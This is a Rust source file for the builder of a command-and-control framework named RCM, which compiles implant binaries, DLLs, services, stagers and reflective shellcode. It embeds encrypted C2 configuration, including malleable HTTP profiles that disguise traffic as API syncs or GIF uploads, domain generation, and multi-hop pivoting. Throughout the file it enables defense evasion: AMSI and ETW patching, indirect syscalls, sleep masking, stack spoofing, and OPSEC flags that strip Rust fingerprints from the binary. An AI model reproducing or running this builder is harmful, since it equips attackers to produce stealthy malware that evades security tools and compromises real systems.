// src/bin/builder.rs
use clap::{ArgAction, Parser, ValueEnum};
use std::process::Command;
use std::fs;
use std::path::PathBuf;
use ed25519_dalek::SigningKey;
use rand::rngs::OsRng;
use rand::RngCore;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use uuid::Uuid;
use serde_json::json;
use anyhow::{Context, Result};
use rusqlite::Connection;
use chrono::{Utc, Duration};
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng as CryptoOsRng},
    Aes256Gcm
};
use std::collections::HashMap;

use rcm::common::{MalleableProfile, HttpBlock, TransformStep};

#[derive(Parser)]
#[command(name = "C2 Builder")]
#[command(author = "RCM")]
#[command(version = "2.0")]
struct Cli {
    #[arg(long, default_value = "127.0.0.1")] host: String,
    #[arg(long, default_value = "4443")] port: String,
    #[arg(long, value_enum, default_value_t = Platform::Linux)] platform: Platform,
    #[arg(long, value_enum, default_value_t = Transport::Tls)] transport: Transport,
    #[arg(long, value_enum, default_value_t = ProfileArg::Default)] profile: ProfileArg,
    #[arg(long)] profile_file: Option<String>,
    #[arg(long, value_enum, default_value_t = Format::Exe)] format: Format,
    #[arg(long)] fallback_file: Option<String>,
    #[arg(long, default_value_t = 40)] sleep: u64,
    #[arg(long, default_value_t = 20)] jitter_min: u32,
    #[arg(long, default_value_t = 10)] jitter_max: u32,
    #[arg(long, default_value_t = 0)] bloat: u64,
    #[arg(long, default_value_t = false)] debug: bool,
    #[arg(long, default_value_t = 0)] days: i64,
    // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
    #[arg(long, visible_alias = "sni")] sni_override: Option<String>,
    #[arg(long, visible_alias = "alpn", value_delimiter = ',')] alpn_protocols: Vec<String>,
    // ── Feature 3: Hibernation / dweller mode ─────────────────────────
    #[arg(long, default_value_t = false)] hibernation: bool,
    #[arg(long, default_value_t = 1)] batch_size: u32,
    // ── DGA: domain generation algorithm ──────────────────────────────
    /// Embed a DGA seed. When set, the agent generates extra C2 domains
    /// each window rather than relying solely on configured endpoints.
    #[arg(long)] dga_seed: Option<u64>,
    /// DGA window length in seconds (default 86400 = 1 day).
    #[arg(long, default_value_t = 86400)] dga_window: u64,
    /// Number of DGA domains per window (default 16).
    #[arg(long, default_value_t = 16)] dga_count: u32,
    /// Comma-separated TLD list for DGA (default "com,net,org").
    #[arg(long, default_value = "com,net,org")] dga_tlds: String,
    // ── Evasion ───────────────────────────────────────────────────────
    /// Sleep masking algorithm: "none" | "ekko" | "foliage".
    #[arg(long, default_value = "ekko")]   sleep_mask:        String,
    /// Use indirect syscall stubs instead of direct ntdll calls.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   indirect_syscalls: bool,
    /// Enable fiber-based call-stack spoofing before every sleep.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   stack_spoof:       bool,
    /// Patch AMSI and ETW on startup.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   patch_amsi_etw:    bool,
    /// Encrypt the heap with AES-256-GCM during sleep windows.
    #[arg(long, action = ArgAction::Set, default_value_t = true)]   heap_encrypt:      bool,
    // ── Execution guardrails ──────────────────────────────────────────
    /// Glob pattern the AD domain must match (e.g. "CORP*"). Empty = disabled.
    #[arg(long, default_value = "")]       guard_domain:      String,
    /// Glob pattern the hostname must match (e.g. "DESKTOP-*"). Empty = disabled.
    #[arg(long, default_value = "")]       guard_hostname:    String,
    /// Active-hours window as "HH-HH", e.g. "8-18". Omit to disable.
    #[arg(long)]                           guard_hours:       Option<String>,
    /// Exit if the agent is running as SYSTEM / root.
    #[arg(long, default_value_t = false)]  guard_no_system:   bool,
    // ── Pivot auto-cascade ────────────────────────────────────────────
    /// TCP port the agent will automatically listen on for the next pivot
    /// hop immediately after its session handshake completes.
    ///
    /// Use this to pre-wire multi-hop chains at build time:
    ///
    ///   hop1: no --auto-pivot-port (operator starts listener manually)
    ///   hop2: --auto-pivot-port 5002
    ///   hop3: --auto-pivot-port 5003
    ///   hop4: no --auto-pivot-port (leaf node, no downstream)
    ///
    /// Omit (default) to disable - leaf nodes and direct-connect agents
    /// do not need this flag.
    #[arg(long)]                           auto_pivot_port:   Option<u16>,
    // ── Shellcode (sRDI-style reflective DLL -> .bin) ──────────────────
    /// ROR13 hash of a DLL export to call after reflective load.
    /// Accepts hex (0x…) or decimal. Default 0x10 = "no export call" -
    /// correct for RCM agents, which start from DllMain.
    #[arg(long, default_value = "0x10", value_parser = parse_u32_auto)]
    sc_hash: u32,
    /// Opaque user-data blob appended to the shellcode (pointer + length
    /// are passed to the loader stub; reachable from the export call).
    #[arg(long, default_value = "None")]
    sc_userdata: String,
    /// Loader flags (bit0: erase PE headers after load, bit1: obfuscate
    /// imports). Default 0.
    #[arg(long, default_value_t = 0)]
    sc_flags: u32,
    /// On-disk encoding for the generated shellcode.
    #[arg(long, value_enum, default_value_t = ScOutput::Bin)]
    sc_output: ScOutput,
}

/// Parse a u32 given as decimal or 0x-prefixed hex (for --sc-hash).
fn parse_u32_auto(s: &str) -> Result<u32, String> {
    let s = s.trim();
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).map_err(|e| format!("invalid hex u32: {e}"))
    } else {
        s.parse::<u32>().map_err(|e| format!("invalid u32: {e}"))
    }
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Platform { Linux, Windows, Macos }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Transport { Tls, TcpPlain, NamedPipe, Http, Https }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ProfileArg { Default, HttpPost, HttpImage }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum Format { Exe, Dll, Service, Stager, Shellcode }

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum ScOutput { Bin, B64, C, Hex }

/// Find the cargo binary. Checks (in order):
///   1. $CARGO_HOME/bin/cargo - set in Docker image
///   2. /usr/local/cargo/bin/cargo - rust:latest default install path
///   3. ~/.cargo/bin/cargo - local user install
///   4. `cargo` in $PATH - last resort
fn find_cargo() -> PathBuf {
    // 1. $CARGO_HOME
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths (rust:latest image)
    let known = [
        "/usr/local/cargo/bin/cargo",
        "/usr/local/bin/cargo",
        "/usr/bin/cargo",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/cargo
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("cargo");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("cargo")
}

/// Find the rustup binary. Mirrors find_cargo() - rustup lives alongside
/// cargo in the same bin directory.
///
/// This is used for target verification. `cargo target list` is NOT a valid
/// cargo subcommand; the correct tool is `rustup target list --installed`.
fn find_rustup() -> PathBuf {
    // 1. $CARGO_HOME/bin/rustup (rustup installs itself here alongside cargo)
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(&cargo_home).join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 2. Known absolute paths
    let known = [
        "/usr/local/cargo/bin/rustup",
        "/usr/local/bin/rustup",
        "/usr/bin/rustup",
    ];
    for path in &known {
        let p = PathBuf::from(path);
        if p.is_file() { return p; }
    }

    // 3. ~/.cargo/bin/rustup
    if let Ok(home) = std::env::var("HOME") {
        let p = PathBuf::from(home).join(".cargo").join("bin").join("rustup");
        if p.is_file() { return p; }
    }

    // 4. Fall back to bare name (relies on PATH)
    PathBuf::from("rustup")
}

/// Locate the project root - the directory containing Cargo.toml.
/// Checks (in order):
///   1. Current working directory
///   2. Directory containing this binary
fn find_project_root() -> Option<PathBuf> {
    // 1. CWD
    if let Ok(cwd) = std::env::current_dir() {
        if cwd.join("Cargo.toml").is_file() {
            return Some(cwd);
        }
    }
    // 2. Adjacent to this binary
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            if dir.join("Cargo.toml").is_file() {
                return Some(dir.to_path_buf());
            }
        }
    }
    None
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    println!("\n=== RCM Builder v2.0 (Malleable) ===");
    println!("[*] Target:      {}", cli.host);
    println!("[*] Port/Pipe:   {}", cli.port);

    if cli.jitter_min > 100 { anyhow::bail!("Jitter Min cannot exceed 100%."); }

    // ── Parse guard_hours into start/end ──────────────────────────────
    // The API passes this as "HH-HH" (e.g. "8-18"). Omitting it leaves
    // both values at 0, which the agent treats as "no time-window check".
    let (guard_hour_start, guard_hour_end): (u8, u8) = match &cli.guard_hours {
        Some(gh) => {
            let parts: Vec<&str> = gh.splitn(2, '-').collect();
            if parts.len() != 2 {
                anyhow::bail!(
                    "guard_hours must be in HH-HH format (e.g. \"8-18\"), got: {}",
                    gh
                );
            }
            let start: u8 = parts[0].parse()
                .with_context(|| format!("guard_hours start '{}' is not a valid hour (0–23)", parts[0]))?;
            let end: u8 = parts[1].parse()
                .with_context(|| format!("guard_hours end '{}' is not a valid hour (0–23)", parts[1]))?;
            (start, end)
        }
        None => (0, 0),
    };

    // ── Locate build tooling ──────────────────────────────────────────
    let cargo_bin = find_cargo();
    println!("[*] Cargo:       {}", cargo_bin.display());

    // Verify cargo is actually executable
    let cargo_version = Command::new(&cargo_bin)
        .arg("--version")
        .output();
    match cargo_version {
        Ok(out) if out.status.success() => {
            let ver = String::from_utf8_lossy(&out.stdout);
            println!("[*] Cargo ver:   {}", ver.trim());
        }
        Ok(out) => {
            anyhow::bail!(
                "cargo --version failed (exit {:?}): {}",
                out.status.code(),
                String::from_utf8_lossy(&out.stderr).trim()
            );
        }
        Err(e) => {
            anyhow::bail!(
                "Cannot execute cargo binary at '{}': {}\n\
                 \n\
                 Ensure the Rust toolchain is installed in the Docker image.\n\
                 The Dockerfile must use a single-stage rust:latest build\n\
                 (not a multi-stage build that strips cargo from the final image).",
                cargo_bin.display(), e
            );
        }
    }

    // ── Locate project root (Cargo.toml) ──────────────────────────────
    let project_root = find_project_root().ok_or_else(|| {
        anyhow::anyhow!(
            "Cannot find Cargo.toml.\n\
             Expected it at CWD ({}) or adjacent to the builder binary.\n\
             In Docker the server must run with WORKDIR=/app and the \
             source tree must be present at /app.",
            std::env::current_dir().unwrap_or_default().display()
        )
    })?;
    println!("[*] Project root: {}", project_root.display());

    // ── Resolve profile ───────────────────────────────────────────────
    let final_profile = if let Some(path) = &cli.profile_file {
        println!("[*] Loading Profile: {}", path);
        let content = fs::read_to_string(path).context("Failed to read profile file")?;
        serde_json::from_str::<MalleableProfile>(&content).context("Invalid Profile JSON format")?
    } else {
        println!("[*] Using Built-in Profile: {:?}", cli.profile);
        construct_builtin_profile(&cli.profile)
    };

    println!("[*] Profile Name: {}", final_profile.name);

    let kill_ts = if cli.days > 0 {
        Utc::now().checked_add_signed(Duration::days(cli.days))
            .map(|dt| dt.timestamp())
    } else { None };

    let build_id = Uuid::new_v4().to_string();
    let hash_salt = Uuid::new_v4().to_string();
    println!("[*] Build ID:     {}", build_id);

    // Log auto-cascade pivot port if configured
    if let Some(port) = cli.auto_pivot_port {
        println!("[*] Auto-pivot:   :{} (cascade listener starts on session connect)", port);
    }

    // ── Crypto setup ──────────────────────────────────────────────────
    let mut csprng = OsRng;
    let signing_key = SigningKey::generate(&mut csprng);
    let verify_key = signing_key.verifying_key();
    let pub_key_b64 = BASE64.encode(verify_key.to_bytes());

    let mut challenge_key_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut challenge_key_bytes);
    let challenge_key_b64 = BASE64.encode(challenge_key_bytes);

    // ── Save server artifacts ─────────────────────────────────────────
    save_server_artifacts(&build_id, &signing_key, &final_profile)?;

    if let Err(e) = try_update_local_db(&build_id, &signing_key, &final_profile, &challenge_key_bytes) {
        println!("[!] Could not auto-update local DB: {}", e);
        println!("[*] Import 'dist/server_keys.json' manually.");
    }

    // ── Build config ──────────────────────────────────────────────────
    let port_u16 = if cli.transport == Transport::NamedPipe {
        0
    } else {
        cli.port.parse::<u16>().context("Port must be a number for TCP/TLS")?
    };

    let final_host = if cli.transport == Transport::NamedPipe {
        format!("{}:{}", cli.host, cli.port)
    } else {
        cli.host.clone()
    };

    // Fallback profiles are parsed as the shared FallbackConfig type. The
    // file format is the field-name-free positional seq (see common.rs):
    //   [[endpoint, ...], strategy_tag, dead_time_secs]
    // with endpoint = [host, port, transport_tag, profile, proxy, priority,
    // weight, max_failures] (trailing elements optional).
    let fallback_cfg: rcm::common::FallbackConfig = if let Some(path) = &cli.fallback_file {
        println!("[*] Loading Fallback: {}", path);
        let content = fs::read_to_string(path).context("Failed to read fallback file")?;
        let parsed: rcm::common::FallbackConfig =
            serde_json::from_str(&content).context("Invalid fallback JSON (expected positional array format)")?;
        println!("[*] Fallback:     {} endpoints, strategy={:?}", parsed.endpoints.len(), parsed.strategy);
        parsed
    } else {
        rcm::common::FallbackConfig {
            endpoints: vec![],
            strategy: rcm::common::FallbackStrategy::Priority,
            dead_time_secs: 300,
        }
    };

    // Assemble the config as a POSITIONAL JSON array matching C2Config's
    // declaration order (transport=0, profile=1, ..., auto_pivot_port=32).
    // serde_json::from_value then drives the manual seq Deserialize impl,
    // and the result is packed into the binary blob that gets encrypted.
    let profile_value = serde_json::to_value(&final_profile)?;
    let fallback_value = serde_json::to_value(&fallback_cfg)?;
    let dga_value = cli.dga_seed.map(|seed| json!([
        seed,
        cli.dga_window,
        cli.dga_count,
        cli.dga_tlds.split(',').collect::<Vec<_>>()
    ]));

    // Transport tag (Tls=0, TcpPlain=1, NamedPipe=2, Http=3, Https=4)
    let transport_tag: u8 = match cli.transport {
        Transport::Tls       => 0,
        Transport::TcpPlain  => 1,
        Transport::NamedPipe => 2,
        Transport::Http      => 3,
        Transport::Https     => 4,
    };

    let config_value = json!([
        transport_tag,          // 0: transport
        profile_value,          // 1: profile
        json!([true, "", "", ""]), // 2: proxy (use_system, url, username, password)
        fallback_value,         // 3: fallback
        pub_key_b64,            // 4: server_public_key
        hash_salt,              // 5: hash_salt
        final_host,             // 6: c2_host
        build_id,               // 7: build_id
        port_u16,               // 8: tunnel_port
        cli.sleep,              // 9: sleep_interval
        cli.jitter_min,         // 10: jitter_min
        cli.jitter_max,         // 11: jitter_max
        cli.bloat,              // 12: bloat_mb
        cli.debug,              // 13: debug
        kill_ts,                // 14: kill_date
        challenge_key_b64,      // 15: challenge_key
        cli.sni_override,       // 16: sni_override
        cli.alpn_protocols,     // 17: alpn_protocols
        cli.hibernation,        // 18: hibernation_mode
        cli.batch_size,         // 19: task_batch_size
        dga_value,              // 20: dga
        Vec::<String>::new(),   // 21: valid_parents (not exposed as a CLI flag)
        // ── Evasion ───────────────────────────────────────────────────
        cli.sleep_mask,         // 22: sleep_mask
        cli.indirect_syscalls,  // 23
        cli.stack_spoof,        // 24
        cli.patch_amsi_etw,     // 25
        cli.heap_encrypt,       // 26
        // ── Execution guardrails ──────────────────────────────────────
        cli.guard_domain,       // 27
        cli.guard_hostname,     // 28
        guard_hour_start,       // 29
        guard_hour_end,         // 30
        cli.guard_no_system,    // 31
        // ── Pivot auto-cascade (null when not set) ────────────────────
        cli.auto_pivot_port,    // 32
    ]);

    let config: rcm::common::C2Config = serde_json::from_value(config_value)
        .context("Internal error: assembled config does not fit the C2Config schema")?;

    println!("[*] Encrypting configuration...");
    let key = Aes256Gcm::generate_key(&mut CryptoOsRng);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut CryptoOsRng);
    let config_packed = config.pack();
    let ciphertext = cipher.encrypt(&nonce, config_packed.as_slice())
        .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;

    let build_env_json = json!({
        "encrypted": true,
        "key_hex": hex::encode(key),
        "nonce_hex": hex::encode(nonce),
        "cipher_hex": hex::encode(ciphertext),
        "bloat_mb": cli.bloat
    }).to_string();

    // Shellcode conversion wraps a Windows x64 DLL - reject other platforms
    // up front instead of after a 10-minute compile.
    if cli.format == Format::Shellcode && cli.platform != Platform::Windows {
        anyhow::bail!(
            "--format shellcode converts the Windows x64 client DLL via reflective-loading \
             and only applies to --platform windows"
        );
    }

    // ── Compile ───────────────────────────────────────────────────────
    let (target, ext) = match cli.platform {
        Platform::Linux   => ("x86_64-unknown-linux-gnu", ""),
        Platform::Windows => ("x86_64-pc-windows-gnu", ".exe"),
        Platform::Macos   => {
            println!("\n[!] WARNING: macOS cross-compilation is not supported in the Docker image.");
            println!("[!] osxcross is required and is not installed.");
            println!("[!] Build macOS agents natively on a macOS host instead.\n");
            ("x86_64-apple-darwin", "")
        }
    };

    // Verify the target is installed before wasting time on compilation.
    //
    // The original code called `cargo target list --installed`, but
    // "cargo target" is not a valid cargo subcommand. cargo exits with an
    // error, the output is empty, `installed` is always false, and the
    // bail fires even when the target IS installed.
    //
    // The correct tool is `rustup target list --installed`. rustup lives
    // in $CARGO_HOME/bin/ alongside cargo, so find_rustup() mirrors the
    // same resolution logic as find_cargo().
    if cli.platform == Platform::Windows {
        let rustup_bin = find_rustup();
        let target_check = Command::new(&rustup_bin)
            .args(["target", "list", "--installed"])
            .output();

        let installed = target_check
            .map(|o| String::from_utf8_lossy(&o.stdout).contains(target))
            .unwrap_or(false);

        if !installed {
            anyhow::bail!(
                "Rust target '{}' is not installed.\n\
                 Run: rustup target add {}",
                target, target
            );
        }
    }

    let (bin_name, output_ext) = match cli.format {
        Format::Exe                  => ("client", ext),
        Format::Dll | Format::Shellcode => ("client_dll", ".dll"),
        Format::Service              => ("client_service", ext),
        Format::Stager               => ("stager", ext),
    };

    let format_name = cli.format.to_possible_value().unwrap().get_name().to_string();
    println!("[*] Format:       {}", format_name);
    println!("[*] Compiling {} for {}...", bin_name, target);

    // Use --target-dir pointing to the cached target/ directory so
    // incremental compilation works across builds.
    let target_dir = project_root.join("target");

    // Pass CARGO_HOME and RUSTUP_HOME explicitly in case the subprocess
    // doesn't inherit them from the environment (can happen when spawned
    // from within the server binary under certain init systems).
    let mut cmd = Command::new(&cargo_bin);
    cmd.args(["build", "--release", "--target", target, "--bin", bin_name])
       .arg("--target-dir")
       .arg(&target_dir)
       .current_dir(&project_root)
       .env("C2_BUILD_CONFIG", &build_env_json);

    // Propagate CARGO_HOME and RUSTUP_HOME
    if let Ok(ch) = std::env::var("CARGO_HOME") {
        cmd.env("CARGO_HOME", &ch);
    } else {
        cmd.env("CARGO_HOME", "/usr/local/cargo");
    }
    if let Ok(rh) = std::env::var("RUSTUP_HOME") {
        cmd.env("RUSTUP_HOME", &rh);
    } else {
        cmd.env("RUSTUP_HOME", "/usr/local/rustup");
    }

    // ── OPSEC RUSTFLAGS: panic-location stripping ─────────────────────
    //
    // Rust panic metadata embeds `file:line:col` for every panic site.
    // On nightly, `-Zlocation-detail=none` removes line/column info and
    // `-Ztrim-paths` rewrites all path prefixes (own crate -> `<crate>/`,
    // registry -> neutral form, sysroot removed), superseding the manual
    // --remap-path-prefix flags. On stable those flags are rejected, so
    // fall back to the path remaps and warn loudly that file:line strings
    // WILL leak into the binary.
    let cargo_home = std::env::var("CARGO_HOME").unwrap_or_else(|_| "/usr/local/cargo".to_string());

    // Toolchain detection: rustc lives next to cargo; fall back to PATH.
    let rustc_bin = cargo_bin.with_file_name("rustc");
    let rustc_version = Command::new(&rustc_bin)
        .arg("--version")
        .output()
        .or_else(|_| Command::new("rustc").arg("--version").output())
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();
    let is_nightly = rustc_version.contains("nightly");

    if is_nightly {
        // Rebuild the standard library from source with the SAME OPSEC flags.
        //
        // Without this, the *prebuilt* core/std still fingerprint the binary
        // as Rust:
        //   - `/rustc/<commit>/library/{core,std,alloc}/...` panic-location
        //     paths (location-detail only applies to crates compiled with it,
        //     and the shipped std was compiled WITHOUT it),
        //   - std panic message strings: "called `Option::unwrap()` on a
        //     `None` value", "thread '<name>' panicked at", index/OOB texts,
        //   - the `RUST_BACKTRACE` env-var name from std's backtrace support.
        //
        // -Zbuild-std recompiles std for the agent target so
        // -Zlocation-detail=none and -Ztrim-paths cover it too;
        // panic_immediate_abort turns every std panic into an immediate abort
        // with NO message formatting machinery, so those strings are never
        // materialized in the binary. Requires the rust-src component.
        let rustup_bin = find_rustup();
        let rust_src_ok = Command::new(&rustup_bin)
            .args(["component", "list", "--installed"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).contains("rust-src"))
            .unwrap_or(false);
        if rust_src_ok {
            println!("[+] OPSEC: rebuilding std with panic_immediate_abort (Rust fingerprints removed)");
            cmd.args([
                "-Zbuild-std=std,panic_abort",
                "-Zbuild-std-features=panic_immediate_abort",
            ]);
        } else {
            println!("[!] ============================================================");
            println!("[!] WARNING: rust-src component not installed.");
            println!("[!] The prebuilt std will leak Rust fingerprints:");
            println!("[!]   /rustc/<hash>/library/... paths, unwrap/panic messages,");
            println!("[!]   RUST_BACKTRACE. Install it: rustup component add rust-src");
            println!("[!] ============================================================");
        }
    }

    let opsec_flags = if is_nightly {
        println!("[+] OPSEC: panic locations stripped (nightly)");
        "-Zlocation-detail=none -Ztrim-paths".to_string()
    } else {
        println!("[!] ============================================================");
        println!("[!] WARNING: stable toolchain detected ('{}').", rustc_version.trim());
        println!("[!] Panic file:line strings WILL leak into the agent binary.");
        println!("[!] Use a nightly toolchain for -Zlocation-detail=none -Ztrim-paths.");
        println!("[!] ============================================================");
        format!(
            "--remap-path-prefix {}=/src --remap-path-prefix {}=/cargo",
            project_root.display(), cargo_home
        )
    };

    // Cargo uses exactly one rustflags source: the env RUSTFLAGS set here
    // SHADOWS the `[target.x86_64-pc-windows-gnu] rustflags` static-link flags
    // in .cargo/config.toml. Re-include them for the MinGW target or the agent
    // ends up depending on mingw runtime DLLs on the target host.
    let target_flags = if target == "x86_64-pc-windows-gnu" {
        // RUSTFLAGS is whitespace-split by cargo, so each flag must be a
        // single token: -C link-arg=<x> (singular) — NOT
        // `-C link-args=-static -static-libgcc ...`, whose space-separated
        // tail would be misparsed as rustc options ("Unrecognized option: 's'").
        " -C link-arg=-static -C link-arg=-static-libgcc -C link-arg=-static-libstdc++"
    } else {
        ""
    };

    // Every build through this path is an AGENT binary (client, client_dll,
    // client_service, stager) - the server and builder itself are compiled
    // separately without these flags. --cfg agent_build compiles the typed
    // config tree (src/config.rs) down to struct definitions + embedded
    // defaults: no TOML parser, no derived serde Deserialize impls, and none
    // of the ~82 field-name strings leak into the agent binary. The
    // --check-cfg registers the custom cfg so the unexpected_cfgs lint stays
    // quiet (mirrored in Cargo.toml [lints.rust] for plain `cargo check`).
    let agent_cfg_flags = " --cfg agent_build --check-cfg=cfg(agent_build)";

    // Preserve operator-provided RUSTFLAGS by appending, not overwriting.
    let rustflags = match std::env::var("RUSTFLAGS") {
        Ok(existing) if !existing.trim().is_empty() => {
            format!("{} {}{}{}", existing, opsec_flags, target_flags, agent_cfg_flags)
        }
        _ => format!("{}{}{}", opsec_flags, target_flags, agent_cfg_flags),
    };
    cmd.env("RUSTFLAGS", rustflags);

    let status = cmd.status().context(
        "Failed to spawn cargo. Verify that cargo is installed and accessible."
    )?;

    if !status.success() {
        anyhow::bail!(
            "cargo build failed (exit {:?}).\n\
             Check the log above for compiler errors.",
            status.code()
        );
    }

    // ── Copy artifact to dist/ ────────────────────────────────────────
    let src_path = target_dir
        .join(target)
        .join("release")
        .join(format!("{}{}", bin_name, output_ext));

    fs::create_dir_all("dist")?;

    let short_id: String = build_id.chars().take(8).collect();

    if cli.format == Format::Shellcode {
        // ── Convert the freshly built DLL to reflective shellcode ─────
        if !src_path.exists() {
            anyhow::bail!(
                "Artifact not found at {}.\n\
                 The build appeared to succeed but the output DLL is missing.",
                src_path.display()
            );
        }
        let dll_bytes = fs::read(&src_path).context("Failed to read built DLL")?;
        let opts = rcm::shellcode::ShellcodeOptions {
            function_hash: cli.sc_hash,
            user_data: cli.sc_userdata.clone().into_bytes(),
            flags: cli.sc_flags,
        };
        let sc = rcm::shellcode::convert_dll_to_shellcode(&dll_bytes, &opts)
            .map_err(|e| anyhow::anyhow!("Shellcode conversion failed: {e}"))?;

        let (encoding, sc_ext) = match cli.sc_output {
            ScOutput::Bin => (rcm::shellcode::ShellcodeEncoding::Raw,    ".bin"),
            ScOutput::B64 => (rcm::shellcode::ShellcodeEncoding::Base64, ".b64.txt"),
            ScOutput::C   => (rcm::shellcode::ShellcodeEncoding::CArray, ".c.txt"),
            ScOutput::Hex => (rcm::shellcode::ShellcodeEncoding::Hex,    ".hex.txt"),
        };
        let rendered = rcm::shellcode::encode_shellcode(&sc, encoding, "rcm_sc");
        let dest_path = PathBuf::from(format!(
            "dist/{}_{}_{}{}", format_name,
            cli.platform.to_possible_value().unwrap().get_name(), short_id, sc_ext
        ));
        fs::write(&dest_path, &rendered)?;

        println!("\n[+] Build Success!");
        // NOTE: the API job watcher harvests the artifact path from the
        // "[+] Binary: " prefix - keep this exact line first.
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
        println!("[+] Profile:  {}", final_profile.name);
        println!("[+] DLL:      {} bytes → shellcode: {} bytes", dll_bytes.len(), sc.len());
        println!("[i] Layout: 69-byte bootstrap + {}-byte RDI stub + DLL + user data", rcm::shellcode::RDI_STUB_LEN);
        println!("[i] Export hash: 0x{:08X} (0x10 = DllMain only), flags: {}", opts.function_hash, opts.flags);
        return Ok(());
    }

    let dest_path = PathBuf::from(format!(
        "dist/{}_{}_{}{}", format_name, cli.platform.to_possible_value().unwrap().get_name(),
        short_id, output_ext
    ));

    if src_path.exists() {
        fs::copy(&src_path, &dest_path)?;
        println!("\n[+] Build Success!");
        println!("[+] Binary: {}", dest_path.display());
        println!("[+] Format: {}", format_name);
        println!("[+] Profile: {}", final_profile.name);
    } else {
        anyhow::bail!(
            "Artifact not found at {}.\n\
             The build appeared to succeed but the output binary is missing.",
            src_path.display()
        );
    }

    Ok(())
}

fn save_server_artifacts(build_id: &str, key: &SigningKey, profile: &MalleableProfile) -> Result<()> {
    fs::create_dir_all("dist")?;
    let key_b64 = BASE64.encode(key.to_bytes());
    let profile_json = serde_json::to_string(profile)?;
    let import_data = json!({
        "build_id": build_id,
        "private_key": key_b64,
        "profile_data": profile_json,
        "note": "Import this into the server database table 'build_keys'"
    });
    fs::write("dist/server_keys.json", serde_json::to_string_pretty(&import_data)?)?;
    Ok(())
}

fn try_update_local_db(build_id: &str, key: &SigningKey, profile: &MalleableProfile, challenge_key: &[u8; 32]) -> Result<()> {
    let db_path = "c2_audit.db";
    let conn = Connection::open(db_path)?;

    conn.execute(
        "CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB,
            profile TEXT DEFAULT 'default',
            profile_data TEXT,
            challenge_key BLOB
        )",
        [],
    )?;

    let col_check = |name: &str| -> bool {
        conn.query_row(
            &format!("SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='{}'", name),
            [], |r| r.get::<_, i32>(0)
        ).unwrap_or(0) > 0
    };
    if !col_check("profile_data") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []);
    }
    if !col_check("challenge_key") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN challenge_key BLOB", []);
    }

    let profile_json = serde_json::to_string(profile)?;
    conn.execute(
        "INSERT OR REPLACE INTO build_keys (build_id, private_key, profile, profile_data, challenge_key) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![build_id, key.to_bytes(), profile.name, profile_json, &challenge_key[..]],
    )?;

    println!("[+] Automatically registered Build ID '{}' (Profile: {}) in local database.", build_id, profile.name);
    Ok(())
}

fn construct_builtin_profile(arg: &ProfileArg) -> MalleableProfile {
    match arg {
        ProfileArg::Default => MalleableProfile::default(),
        ProfileArg::HttpPost => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "application/octet-stream".into());
            headers.insert("Accept".into(), "*/*".into());
            MalleableProfile {
                name: "legacy_http_post".into(),
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Legacy/1.0".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Base64],
                },
                http_post: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers,
                    data_transform: vec![TransformStep::Base64],
                }
            }
        },
        ProfileArg::HttpImage => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "image/gif".into());
            let gif_magic = "GIF89a".to_string();
            MalleableProfile {
                name: "legacy_http_image".into(),
                user_agent: "Mozilla/5.0 (Compatible; ImageFetcher/1.0)".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/image.gif".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Append(gif_magic.clone())],
                },
                http_post: HttpBlock {
                    uris: vec!["/upload.gif".into()],
                    headers,
                    data_transform: vec![TransformStep::Prepend(gif_magic)],
                }
            }
        }
    }
}